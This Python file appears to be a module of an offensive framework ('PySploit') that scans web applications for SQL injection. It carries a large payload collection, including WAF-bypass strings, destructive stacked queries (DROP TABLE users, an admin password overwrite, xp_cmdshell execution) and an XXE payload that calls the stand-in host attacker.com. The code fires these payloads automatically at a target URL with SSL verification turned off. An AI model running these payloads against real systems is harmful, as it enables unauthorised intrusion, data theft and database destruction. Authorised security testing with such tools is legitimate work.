#!/usr/bin/env python3
"""
SQL Injection Scanner Auxiliary Module - MODERN PAYLOADS VERSION
"""

import time
import requests
import json
import urllib.parse
import random
import string
from typing import Dict, List, Optional
from auxiliary.auxiliary_base import AuxiliaryBase

class ModSQLInjectionScanner(AuxiliaryBase):
    def __init__(self):
        super().__init__()
        self.name = "auxiliary/scanner/web/mod_sql_Injection"
        self.description = "Comprehensive SQL Injection Vulnerability Scanner with Modern Payloads"
        self.author = "PySploit Framework"
        self.references = [
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://portswigger.net/web-security/sql-injection",
            "https://github.com/payloadbox/sql-injection-payload-list"
        ]
        self.targets = ["Web applications", "APIs", "Web services"]
        
        self.options = {
            'RHOSTS': {'type': 'string', 'required': True, 'description': 'Target URL (http://example.com)'},
            'TARGETURI': {'type': 'string', 'required': False, 'default': '/', 'description': 'Target URI path'},
            'METHOD': {'type': 'string', 'required': False, 'default': 'AUTO', 'description': 'HTTP method (GET|POST|AUTO)'},
            'PARAMETERS': {'type': 'string', 'required': False, 'default': 'id,page,user,category,search,product,article', 'description': 'GET parameters to test (comma-separated)'},
            'DATA': {'type': 'string', 'required': False, 'default': 'username,password,email,query,search,login,pass', 'description': 'POST data parameters to test'},
            'COOKIES': {'type': 'string', 'required': False, 'description': 'Cookies for authenticated scanning'},
            'USER_AGENT': {'type': 'string', 'required': False, 'default': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'description': 'User-Agent header'},
            'TIMEOUT': {'type': 'int', 'required': False, 'default': 5, 'description': 'Request timeout in seconds'},
            'VERBOSE': {'type': 'bool', 'required': False, 'default': True, 'description': 'Show detailed output'},
            'AGGRESSIVE': {'type': 'bool', 'required': False, 'default': False, 'description': 'Use more aggressive payloads'},
            'DEPTH': {'type': 'int', 'required': False, 'default': 2, 'description': 'Scan depth (1=Quick, 2=Normal, 3=Deep)'}
        }
        
        self.vulnerabilities = []
        self.session = None
        self.baseline_response = None
        
        # Modern SQL injection payload database
        self.payloads = self._initialize_payloads()

    def _initialize_payloads(self):
        """Initialize comprehensive modern SQL injection payloads"""
        return {
            # === CLASSIC SQLi PAYLOADS ===
            'classic': [
                # Basic injection
                "'", "''", "`", "\\", "\"", "')", "`)", '\")',
                
                # Always true conditions
                "' OR '1'='1", "' OR 1=1", "' OR 1=1--", "' OR 1=1#",
                "' OR 'a'='a", "' OR 'x'='x", " OR 1=1", " OR 1=1--",
                "admin' OR '1'='1", "admin' OR 1=1", "admin'--", "admin'#",
                
                # Login bypass
                "' UNION SELECT 1,2,3--", "' UNION SELECT 1,'admin','pass'--",
                "admin' UNION SELECT 1,2,3--", "' OR username = 'admin'--",
                
                # Comment variations
                "'--", "';--", "')--", "'));--", "'/*", "*/--",
            ],
            
            # === ERROR-BASED SQLi PAYLOADS ===
            'error_based': [
                # MySQL Error-based
                "' AND EXTRACTVALUE(0,CONCAT(0x5c,USER()))--",
                "' AND UPDATEXML(1,CONCAT(0x5c,USER()),1)--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(USER(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
                
                # PostgreSQL Error-based
                "' AND 1=CAST((SELECT version()) AS INT)--",
                "' AND 1=CAST((SELECT current_user) AS INT)--",
                
                # MSSQL Error-based
                "' AND 1=CONVERT(int, (SELECT @@version))--",
                "' AND 1=CONVERT(int, (SELECT USER_NAME()))--",
                
                # Oracle Error-based
                "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT USER FROM DUAL))--",
                "' AND (SELECT COUNT(*) FROM ALL_USERS)=UTL_INADDR.get_host_name((SELECT USER FROM DUAL))--",
            ],
            
            # === UNION-BASED SQLi PAYLOADS ===
            'union': [
                # Column counting
                "' ORDER BY 1--", "' ORDER BY 2--", "' ORDER BY 3--", "' ORDER BY 4--", "' ORDER BY 5--",
                "' ORDER BY 6--", "' ORDER BY 7--", "' ORDER BY 8--", "' ORDER BY 9--", "' ORDER BY 10--",
                
                # UNION column detection
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                
                # Database version detection
                "' UNION SELECT @@version--", "' UNION SELECT version()--",
                "' UNION SELECT banner FROM v$version--", "' UNION SELECT @@version,2--",
                
                # Database information
                "' UNION SELECT database()--", "' UNION SELECT current_user--",
                "' UNION SELECT user()--", "' UNION SELECT schema()--",
                
                # Table enumeration
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT table_name FROM all_tables--",
                "' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
                
                # Column enumeration
                "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--",
            ],
            
            # === BOOLEAN-BASED BLIND SQLi PAYLOADS ===
            'boolean_blind': [
                # Basic boolean tests
                "' AND '1'='1", "' AND '1'='2", "' AND 1=1", "' AND 1=2",
                "' OR '1'='1", "' OR '1'='2", " AND 1=1", " AND 1=2",
                
                # Substring-based data extraction
                "' AND SUBSTRING((SELECT USER()),1,1)='a'--",
                "' AND ASCII(SUBSTRING((SELECT USER()),1,1))=97--",
                "' AND (SELECT SUBSTRING(version(),1,1))='5'--",
                
                # Length-based tests
                "' AND (SELECT LENGTH(USER()))=10--",
                "' AND (SELECT LENGTH(database()))>5--",
                
                # Database-specific boolean tests
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND (SELECT COUNT(*) FROM all_tables)>0--",
            ],
            
            # === TIME-BASED BLIND SQLi PAYLOADS ===
            'time_based': [
                # MySQL time delays
                "' AND SLEEP(5)--", "' AND BENCHMARK(1000000,MD5('A'))--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                
                # PostgreSQL time delays
                "' AND pg_sleep(5)--", "' AND (SELECT pg_sleep(5))--",
                
                # MSSQL time delays
                "' AND WAITFOR DELAY '00:00:05'--", "'; WAITFOR DELAY '00:00:05'--",
                
                # Oracle time delays
                "' AND (SELECT COUNT(*) FROM all_users a, all_users b, all_users c)>0--",
                "' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)=0--",
                
                # SQLite time delays
                "' AND randomblob(100000000)--",
            ],
            
            # === STACKED QUERIES SQLi PAYLOADS ===
            'stacked': [
                # MySQL stacked queries
                "'; DROP TABLE users--", "'; CREATE TABLE test (id int)--",
                "'; UPDATE users SET password='hacked' WHERE user='admin'--",
                
                # MSSQL stacked queries
                "'; EXEC xp_cmdshell('dir')--", "'; EXEC sp_configure 'show advanced options',1--",
                
                # PostgreSQL stacked queries
                "'; DROP TABLE users;--", "'; CREATE TABLE test (id int);--",
            ],
            
            # === SECOND-ORDER SQLi PAYLOADS ===
            'second_order': [
                "admin'; UPDATE users SET password='hacked' WHERE username='admin'--",
                "test'; INSERT INTO logs (event) VALUES ('SQLi attempt')--",
            ],
            
            # === NO-SQL INJECTION PAYLOADS ===
            'nosql': [
                # MongoDB injection
                '{"$ne": "invalid"}', '{"$gt": ""}', '{"$where": "1==1"}',
                'admin", "password": {"$ne": null } }',
                
                # JSON injection
                '{"username": {"$ne": null}, "password": {"$ne": null}}',
            ],
            
            # === WAF BYPASS PAYLOADS ===
            'waf_bypass': [
                # Case variation
                "' Or '1'='1", "' oR '1'='1", "' OR '1'='1", "' Or '1'='1",
                
                # Double URL encoding
                "%2527%2520OR%25201%253D1",
                
                # Unicode encoding
                "%u0027%u0020OR%u00201%u003D1",
                "%u0027%u0020%u004f%u0052%u0020%u0031%u003d%u0031",
                
                # HTML encoding
                "&#39; OR 1=1", "&apos; OR 1=1", "&#x27; OR 1=1",
                
                # Mixed encoding
                "%55%4e%49%4f%4e %53%45%4c%45%43%54",
                
                # Whitespace alternatives
                "'%09OR%091=1", "'%0AOR%0A1=1", "'%0COR%0C1=1", "'%0DOR%0D1=1",
                
                # Comment bypass
                "'/*!50000OR*/1=1", "'/**/OR/**/1=1", "'/*!OR*/1=1",
                
                # Parenthesis bypass
                "') OR ('1'='1", "')) OR (('1'='1",
                
                # JSON escape
                "\\' OR 1=1", "\\\\' OR 1=1",
            ],
            
            # === MODERN FRAMEWORK PAYLOADS ===
            'modern': [
                # Laravel/Eloquent
                "' or 1=1)--", "') or 1=1--", "')) or 1=1--",
                
                # Django ORM
                "' OR 1=1))--", "') OR 1=1))--",
                
                # Ruby on Rails
                "' OR 1=1))/*", "') OR 1=1))/*",
                
                # Node.js/Express
                "' || '1'='1", "' || 1=1", "'; return true; //",
            ],
            
            # === HEADER-BASED SQLi PAYLOADS ===
            'header_injection': [
                # User-Agent injection
                "' OR '1'='1", "' OR 1=1--",
                
                # X-Forwarded-For injection
                "' OR 1=1--", "1' OR '1'='1",
                
                # Referer injection
                "' OR 1=1--", "admin' OR 1=1--",
            ],
            
            # === XML-BASED SQLi PAYLOADS ===
            'xml_injection': [
                # XML entity injection
                "<![CDATA[' OR 1=1--]]>",
                "<?xml version='1.0'?><test>' OR 1=1--</test>",
                
                # XXE with SQLi
                "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://attacker.com'>]><test>&xxe;</test>",
            ],
            
            # === ADVANCED FILTER BYPASS ===
            'advanced_bypass': [
                # Hex encoding
                "0x27204f52202731273d2731",  # ' OR '1'='1 in hex
                "0x61646d696e272d2d",  # admin'--
                
                # Char() function
                "'+char(32)+char(79)+char(82)+char(32)+char(49)+char(61)+char(49)+'",
                
                # Concatenation
                "'" + "+" + "'" + "OR" + "'" + "1'='1",
                "concat('','OR','','1','=','1')",
                
                # Base64 encoding in payload
                "admin' AND 1=1 UNION SELECT TO_BASE64('test')--",
            ]
        }

    def get_option(self, name):
        """Safely get option value with proper type conversion"""
        if name in self.options and 'value' in self.options[name]:
            value = self.options[name]['value']
        elif 'default' in self.options[name]:
            value = self.options[name]['default']
        else:
            return None
        
        # Type conversion
        option_type = self.options[name].get('type', 'string')
        
        if option_type == 'int':
            try:
                return int(value)
            except (ValueError, TypeError):
                print(f"[!] Warning: Option {name} should be integer, using default")
                return self.options[name].get('default')
        elif option_type == 'bool':
            if isinstance(value, str):
                return value.lower() in ('true', 'yes', '1', 'on')
            return bool(value)
        else:
            return str(value)

    def initialize_session(self):
        """Initialize HTTP session with headers and cookies"""
        self.session = requests.Session()
        
        # Set User-Agent
        user_agent = self.get_option('USER_AGENT')
        if user_agent:
            self.session.headers.update({'User-Agent': user_agent})
        
        # Set cookies if provided
        cookies_str = self.get_option('COOKIES')
        if cookies_str:
            try:
                cookies = {}
                for cookie in cookies_str.split(';'):
                    if '=' in cookie:
                        key, value = cookie.strip().split('=', 1)
                        cookies[key] = value
                self.session.cookies.update(cookies)
            except Exception as e:
                print(f"[!] Warning: Failed to parse cookies: {e}")
        
        # Disable SSL verification for testing
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()

    def get_baseline(self, url, method, parameters):
        """Get baseline response for comparison"""
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=parameters, timeout=self.get_option('TIMEOUT'), verify=False)
            else:
                response = self.session.post(url, data=parameters, timeout=self.get_option('TIMEOUT'), verify=False)
            
            return response
        except Exception as e:
            if self.get_option('VERBOSE'):
                print(f"[-] Baseline request failed: {e}")
            return None

    def test_payload_category(self, url, method, parameters, category_name, payloads):
        """Test a specific category of payloads"""
        vulnerabilities = []
        tested = 0
        
        for payload in payloads:
            try:
                tested += 1
                if self.get_option('VERBOSE') and tested % 10 == 0:
                    print(f"[*] {category_name}: Tested {tested}/{len(payloads)} payloads")
                
                response = self._send_safe_request(url, method, parameters, payload)
                if not response:
                    continue
                    
                # Check for SQL errors
                if response.status_code == 200 and self._detect_sql_errors(response.text):
                    vulnerabilities.append({
                        'type': f"SQL Injection - {category_name}",
                        'url': url,
                        'parameter': list(parameters.keys())[0] if parameters else 'unknown',
                        'payload': payload,
                        'evidence': "SQL error detected",
                        'risk_level': 'High',
                        'confidence': 'High',
                        'response_code': response.status_code
                    })
                    continue
                
                # Check for different response than baseline
                if (self.baseline_response and 
                    response.status_code == 200 and 
                    self.baseline_response.status_code == 200 and
                    self._is_response_different(response.text, self.baseline_response.text)):
                    vulnerabilities.append({
                        'type': f"SQL Injection - {category_name}",
                        'url': url,
                        'parameter': list(parameters.keys())[0] if parameters else 'unknown',
                        'payload': payload,
                        'evidence': "Different response content",
                        'risk_level': 'Medium',
                        'confidence': 'Medium',
                        'response_code': response.status_code
                    })
                    
            except Exception as e:
                if self.get_option('VERBOSE'):
                    print(f"[-] {category_name} test failed: {e}")
                continue
                
        return vulnerabilities
    def test_numeric_injection(self, url, method, parameters):
        """Test numeric SQL injection (no quotes needed)"""
        vulnerabilities = []
        
        # Numeric boolean payloads (no quotes)
        numeric_payloads = [
            # Basic numeric injections
            "1 OR 1=1", "1 OR 1=1--", "1 OR 1=1#",
            "1 OR 0=0", "1 OR 0=1", 
            "1 AND 1=1", "1 AND 1=2",
            "1' OR '1'='1", "1' OR 1=1",  # Mixed numeric/string
            
            # Arithmetic operations
            "1+1", "2-1", "3*1", "4/1",
            "1 /*!50000OR*/ 1=1",
            
            # Bitwise operations
            "1|1", "1&1", "1^0",
            
            # Comparison operators
            "1=1", "2>1", "1<2", "1<>2",
            
            # Parenthesis variations
            "(1) OR (1=1)", "1) OR (1=1", "1)) OR ((1=1",
            
            # Boolean without spaces
            "1OR1=1", "1/**/OR/**/1=1", "1%09OR%091=1",
            
            # Advanced numeric injections
            "1 UNION SELECT 1,2,3", "1 UNION ALL SELECT 1,2,3",
            "1; SELECT 1,2,3", "1 AND (SELECT 1)=1",
            
            # Your specific case
            "1 OR 0", "0 OR 1", "1 AND 0", "0 AND 1",
        ]
        
        for payload in numeric_payloads:
            try:
                response = self._send_safe_request(url, method, parameters, payload)
                if not response:
                    continue
                    
                # Check for different response
                if (self.baseline_response and 
                    response.status_code == 200 and 
                    self.baseline_response.status_code == 200 and
                    self._is_response_different(response.text, self.baseline_response.text)):
                    
                    vulnerabilities.append({
                        'type': "Numeric SQL Injection",
                        'url': url,
                        'parameter': list(parameters.keys())[0] if parameters else 'unknown',
                        'payload': payload,
                        'evidence': "Different response for numeric injection",
                        'risk_level': 'High',
                        'confidence': 'High',
                        'response_code': response.status_code
                    })
                    print(f"[+] FOUND: Numeric injection with payload: {payload}")
                    
                # Check for SQL errors
                if response.status_code == 200 and self._detect_sql_errors(response.text):
                    vulnerabilities.append({
                        'type': "Numeric SQL Injection (Error-based)",
                        'url': url,
                        'parameter': list(parameters.keys())[0] if parameters else 'unknown',
                        'payload': payload,
                        'evidence': "SQL error in numeric injection",
                        'risk_level': 'High',
                        'confidence': 'High',
                        'response_code': response.status_code
                    })
                    print(f"[+] FOUND: Error-based numeric injection: {payload}")
                    
            except Exception as e:
                continue
                
        return vulnerabilities
    

    def test_boolean_blind_advanced(self, url, method, parameters):
        """Advanced boolean-based blind SQL injection"""
        vulnerabilities = []
        
        # Test different database types with boolean logic
        db_tests = {
            'MySQL': [
                ("' AND (SELECT SUBSTRING(@@version,1,1))='5'--", "' AND (SELECT SUBSTRING(@@version,1,1))='6'--"),
                ("' AND (SELECT user())='root@localhost'--", "' AND (SELECT user())='wrong'--"),
            ],
            'PostgreSQL': [
                ("' AND (SELECT SUBSTRING(version(),1,6))='Postg'--", "' AND (SELECT SUBSTRING(version(),1,6))='Wrong'--"),
            ],
            'MSSQL': [
                ("' AND (SELECT SUBSTRING(@@version,1,3))='Mic'--", "' AND (SELECT SUBSTRING(@@version,1,3))='Wro'--"),
            ]
        }
        
        for db_type, tests in db_tests.items():
            for true_payload, false_payload in tests:
                try:
                    true_response = self._send_safe_request(url, method, parameters, true_payload)
                    false_response = self._send_safe_request(url, method, parameters, false_payload)
                    
                    if not true_response or not false_response:
                        continue
                        
                    if (true_response.status_code == 200 and false_response.status_code == 200 and
                        self._is_response_different(true_response.text, false_response.text)):
                        vulnerabilities.append({
                            'type': f"Boolean-based Blind SQLi ({db_type})",
                            'url': url,
                            'parameter': list(parameters.keys())[0] if parameters else 'unknown',
                            'payload': f"DB Detection: {true_payload}",
                            'evidence': f"Different responses indicate {db_type} database",
                            'risk_level': 'High',
                            'confidence': 'Medium',
                            'response_code': 200
                        })
                        break
                        
                except Exception as e:
                    continue
                    
        return vulnerabilities

    def test_time_based_advanced(self, url, method, parameters):
        """Advanced time-based blind SQL injection"""
        vulnerabilities = []
        
        # Extended time-based payloads for different databases
        time_payloads = [
            # MySQL variations
            ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", "MySQL"),
            ("' AND SLEEP(3) AND '1'='1", "MySQL"),
            
            # PostgreSQL variations
            ("' AND (SELECT pg_sleep(3))--", "PostgreSQL"),
            ("'; SELECT pg_sleep(3)--", "PostgreSQL"),
            
            # MSSQL variations
            ("' WAITFOR DELAY '00:00:03'--", "MSSQL"),
            ("); WAITFOR DELAY '00:00:03'--", "MSSQL"),
            
            # SQLite variations
            ("' AND randomblob(1000000000)--", "SQLite"),
        ]
        
        for payload, db_type in time_payloads:
            try:
                start_time = time.time()
                response = self._send_safe_request(url, method, parameters, payload)
                end_time = time.time()
                
                if not response:
                    continue
                    
                response_time = end_time - start_time
                if response_time >= 2.5:  # Reduced threshold for better detection
                    vulnerabilities.append({
                        'type': f"Time-based Blind SQLi ({db_type})",
                        'url': url,
                        'parameter': list(parameters.keys())[0] if parameters else 'unknown',
                        'payload': payload,
                        'evidence': f"Response delayed by {response_time:.2f} seconds",
                        'risk_level': 'Medium',
                        'confidence': 'Medium',
                        'response_code': response.status_code if response else 0
                    })
                    break
                    
            except Exception as e:
                continue
                
        return vulnerabilities

    def _send_safe_request(self, url, method, original_parameters, payload):
        """Send request with better error handling and payload encoding"""
        try:
            # Create safe parameters - only modify one parameter
            test_parameters = {}
            if original_parameters:
                param_names = list(original_parameters.keys())
                if param_names:
                    first_param = param_names[0]
                    
                    # Try different encoding strategies
                    encoded_payloads = [
                        payload,  # Raw
                        urllib.parse.quote(payload),  # URL encoded
                        urllib.parse.quote_plus(payload),  # URL+ encoded
                        payload.replace("'", "%27").replace('"', "%22"),  # Basic encoding
                        payload.replace(" ", "%20"),  # Space encoding
                    ]
                    
                    for encoded_payload in encoded_payloads:
                        test_parameters = original_parameters.copy()
                        test_parameters[first_param] = encoded_payload
                        
                        timeout = self.get_option('TIMEOUT')
                        
                        if self.get_option('VERBOSE'):
                            print(f"[*] Testing: {first_param}={encoded_payload[:50]}...")
                        
                        if method.upper() == 'GET':
                            response = self.session.get(url, params=test_parameters, timeout=timeout, verify=False)
                        else:
                            response = self.session.post(url, data=test_parameters, timeout=timeout, verify=False)
                        
                        if response.status_code != 400:  # Skip bad requests
                            if self.get_option('VERBOSE'):
                                print(f"[*] Response: {response.status_code}")
                            return response
                        else:
                            if self.get_option('VERBOSE'):
                                print(f"[-] Got 400, trying next encoding...")
            
            return None
                
        except requests.exceptions.Timeout:
            if self.get_option('VERBOSE'):
                print(f"[-] Timeout for payload")
            return None
        except requests.exceptions.ConnectionError:
            if self.get_option('VERBOSE'):
                print(f"[-] Connection error")
            return None
        except Exception as e:
            if self.get_option('VERBOSE'):
                print(f"[-] Request failed: {e}")
            return None

    def _detect_sql_errors(self, response_text):
        """Detect SQL errors in response with enhanced patterns"""
        sql_errors = [
            # MySQL errors
            "mysql", "mysqli", "mysql_fetch", "you have an error in your sql syntax",
            "supplied argument is not a valid mysql", "unclosed quotation mark",
            
            # PostgreSQL errors
            "postgresql", "psql", "pg_", "postgres", "plpgsql",
            
            # MSSQL errors
            "microsoft ole db", "odbc driver", "sqlserver", "incorrect syntax near",
            "unclosed quotation mark after the character string",
            
            # Oracle errors
            "ora-", "oracle", "pl/sql", "oci_",
            
            # SQLite errors
            "sqlite", "sqlite3",
            
            # Generic SQL errors
            "sql", "database", "query", "syntax error", "sql syntax",
            "warning:", "error", "exception", "stack trace", "at line",
        ]
        text_lower = response_text.lower()
        return any(error in text_lower for error in sql_errors)

    def _is_response_different(self, response1, response2, threshold=0.3):
        """Check if two responses are significantly different"""
        if response1 == response2:
            return False
        
        # Simple length-based difference check
        len1, len2 = len(response1), len(response2)
        if len1 == 0 or len2 == 0:
            return True
            
        length_diff = abs(len1 - len2) / max(len1, len2)
        return length_diff > threshold

    def discover_parameters(self, url):
        """Try to discover what parameters the endpoint expects"""
        print("[*] Discovering parameters...")
        
        # Extended parameter discovery
        test_combinations = [
            # Common parameter names with different values
            {'id': '1', 'page': '1', 'category': 'test', 'product': '1'},
            {'search': 'test', 'q': 'test', 'query': 'test', 's': 'test'},
            {'user': 'test', 'username': 'test', 'name': 'test', 'email': 'test@test.com'},
            {'article': '1', 'post': '1', 'news': '1', 'blog': '1'},
            {'file': 'test', 'document': 'test', 'image': 'test'},
            {'year': '2024', 'month': '1', 'day': '1', 'date': '2024-01-01'},
        ]
        
        working_params = []
        for params in test_combinations:
            try:
                response = self.session.get(url, params=params, timeout=3, verify=False)
                if response.status_code == 200:
                    print(f"[+] Parameters might work: {list(params.keys())}")
                    working_params.extend(list(params.keys()))
            except:
                continue
        
        return list(set(working_params)) if working_params else ['id']  # Fallback

    def scan_endpoint(self, url, method, parameters_list):
        """Scan a single endpoint with multiple parameters"""
        vulnerabilities = []
        
        for param_name in parameters_list:
            if self.get_option('VERBOSE'):
                print(f"\n[*] Testing parameter: {param_name}")
            
            parameters = {param_name: '1'}  # Start with safe value
            
            # Get baseline
            self.baseline_response = self.get_baseline(url, method, parameters)
            if not self.baseline_response:
                if self.get_option('VERBOSE'):
                    print(f"[-] Could not get baseline for {param_name}")
                continue
                
            if self.get_option('VERBOSE'):
                print(f"[*] Baseline status: {self.baseline_response.status_code}")
            print(f"[*] Testing numeric injection for parameter: {param_name}")
            numeric_vulns = self.test_numeric_injection(url, method, parameters)
            vulnerabilities.extend(numeric_vulns)
            if numeric_vulns:
                print(f"[+] Found {len(numeric_vulns)} numeric injection vulnerabilities!")
            # Determine which payload categories to test based on depth
            depth = self.get_option('DEPTH')
            categories_to_test = []
            
            if depth == 1:  # Quick scan
                categories_to_test = ['classic', 'boolean_blind']
            elif depth == 2:  # Normal scan
                categories_to_test = ['classic', 'error_based', 'boolean_blind', 'union', 'time_based']
            else:  # Deep scan (depth >= 3)
                categories_to_test = list(self.payloads.keys())
            
            
            # Test selected payload categories
            for category in categories_to_test:
                if category in self.payloads:
                    if self.get_option('VERBOSE'):
                        print(f"[*] Testing {category} payloads...")
                    
                    category_vulns = self.test_payload_category(
                        url, method, parameters, category, self.payloads[category]
                    )
                    vulnerabilities.extend(category_vulns)
                    
                    if category_vulns and self.get_option('VERBOSE'):
                        print(f"[+] Found {len(category_vulns)} vulnerabilities in {category}")
            
            # Advanced tests
            if depth >= 2:
                advanced_vulns = self.test_boolean_blind_advanced(url, method, parameters)
                vulnerabilities.extend(advanced_vulns)
                
                time_vulns = self.test_time_based_advanced(url, method, parameters)
                vulnerabilities.extend(time_vulns)
        
        return vulnerabilities

    def run(self):
        """Main scan method"""
        print("[*] Starting Modern SQL Injection Scanner...")
        print(f"[*] Loaded {sum(len(payloads) for payloads in self.payloads.values())} total payloads")
        
        # Get options
        rhosts = self.get_option('RHOSTS')
        target_uri = self.get_option('TARGETURI')
        method = self.get_option('METHOD')
        parameters_str = self.get_option('PARAMETERS')
        data_str = self.get_option('DATA')
        verbose = self.get_option('VERBOSE')
        depth = self.get_option('DEPTH')
        
        if not rhosts:
            print("[-] RHOSTS is required")
            return False
        
        # Initialize HTTP session
        self.initialize_session()
        
        # Build target URL
        target_url = rhosts.rstrip('/') + '/' + target_uri.lstrip('/')
        
        # Parse parameters
        get_parameters = [p.strip() for p in parameters_str.split(',')] if parameters_str else []
        post_parameters = [p.strip() for p in data_str.split(',')] if data_str else []
        
        print(f"[*] Target: {target_url}")
        print(f"[*] Method: {method}")
        print(f"[*] Depth: {depth} ({'Quick' if depth==1 else 'Normal' if depth==2 else 'Deep'})")
        print(f"[*] GET Parameters: {', '.join(get_parameters)}")
        print(f"[*] POST Parameters: {', '.join(post_parameters)}")
        print("[*] Scanning...\n")
        
        start_time = time.time()
        self.vulnerabilities = []
        
        try:
            # Auto-detect method if needed
            if method.upper() == 'AUTO':
                # Try GET first
                test_response = self.session.get(target_url, timeout=5, verify=False)
                if test_response.status_code == 200:
                    method = 'GET'
                    print("[*] Auto-detected: Using GET method")
                else:
                    method = 'POST'
                    print("[*] Auto-detected: Using POST method")
            
            # Discover parameters if none provided
            if not get_parameters and method.upper() == 'GET':
                get_parameters = self.discover_parameters(target_url)
            
            # Scan based on method
            if method.upper() == 'GET' and get_parameters:
                print(f"[*] Testing GET with parameters: {get_parameters}")
                get_vulns = self.scan_endpoint(target_url, 'GET', get_parameters)
                self.vulnerabilities.extend(get_vulns)
            
            elif method.upper() == 'POST' and post_parameters:
                print(f"[*] Testing POST with parameters: {post_parameters}")
                post_vulns = self.scan_endpoint(target_url, 'POST', post_parameters)
                self.vulnerabilities.extend(post_vulns)
            
            # Show results
            scan_time = time.time() - start_time
            self.show_results(scan_time)
            
            return True
            
        except Exception as e:
            print(f"[-] Scan error: {e}")
            if verbose:
                import traceback
                traceback.print_exc()
            return False

    def show_results(self, scan_time):
        """Display scan results"""
        print(f"\n[*] Scan completed in {scan_time:.2f} seconds")
        print(f"[*] Found {len(self.vulnerabilities)} vulnerabilities\n")
        
        if self.vulnerabilities:
            print("VULNERABILITIES FOUND:")
            print("=" * 80)
            
            # Group by vulnerability type
            vuln_by_type = {}
            for vuln in self.vulnerabilities:
                vuln_type = vuln['type']
                if vuln_type not in vuln_by_type:
                    vuln_by_type[vuln_type] = []
                vuln_by_type[vuln_type].append(vuln)
            
            for vuln_type, vulns in vuln_by_type.items():
                print(f"\n{vuln_type.upper()} ({len(vulns)} found):")
                print("-" * 50)
                
                for i, vuln in enumerate(vulns[:5], 1):  # Show first 5 of each type
                    print(f"  {i}. Parameter: {vuln['parameter']}")
                    print(f"     Payload: {vuln['payload'][:100]}...")
                    print(f"     Evidence: {vuln['evidence']}")
                    print(f"     Risk: {vuln['risk_level']}, Confidence: {vuln['confidence']}")
                
                if len(vulns) > 5:
                    print(f"  ... and {len(vulns) - 5} more")
        
        else:
            print("[+] No SQL injection vulnerabilities found")
        
        # Generate report file
        self.generate_report()

    def generate_report(self):
        """Generate comprehensive vulnerability report"""
        report = {
            "scan_info": {
                "target": self.get_option('RHOSTS'),
                "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "module": self.name,
                "vulnerabilities_found": len(self.vulnerabilities),
                "payloads_tested": sum(len(payloads) for payloads in self.payloads.values())
            },
            "vulnerabilities": self.vulnerabilities,
            "summary": {
                "high_risk": len([v for v in self.vulnerabilities if v['risk_level'] == 'High']),
                "medium_risk": len([v for v in self.vulnerabilities if v['risk_level'] == 'Medium']),
                "low_risk": len([v for v in self.vulnerabilities if v['risk_level'] == 'Low'])
            }
        }
        
        # Save report to file
        filename = f"sql_injection_scan_{int(time.time())}.json"
        try:
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"[+] Detailed report saved to: {filename}")
        except Exception as e:
            print(f"[-] Failed to save report: {e}")
        
        return report